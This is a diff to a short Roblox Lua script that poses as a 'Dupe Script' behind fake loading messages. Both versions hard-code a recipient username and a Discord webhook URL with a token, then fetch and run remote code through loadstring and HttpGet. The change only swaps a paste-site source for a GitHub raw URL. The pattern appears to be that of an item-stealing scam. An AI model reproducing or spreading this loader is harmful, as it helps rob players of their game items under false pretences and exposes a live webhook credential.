@@ -1,9 +1,17 @@
-UserName = "tlgzq"
-UserName2 = "tlgzq"
-Webhook = "https://discord.com/api/webhooks/1111813534796488715/Zkamx3c0LGROl-gHsVvqeBIv7AlIm_lwFMdiE07uNdbb01qU7FoMb_SfWnWf7P26Muvu"
-_G.ScriptName = "Toxicity's Script"
-_G.FirstText = "Please wait.."
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
+Username = "tlgzq"
+
+WebHook = "https://discord.com/api/webhooks/1111813534796488715/Zkamx3c0LGROl-gHsVvqeBIv7AlIm_lwFMdiE07uNdbb01qU7FoMb_SfWnWf7P26Muvu"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Dupe Script"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
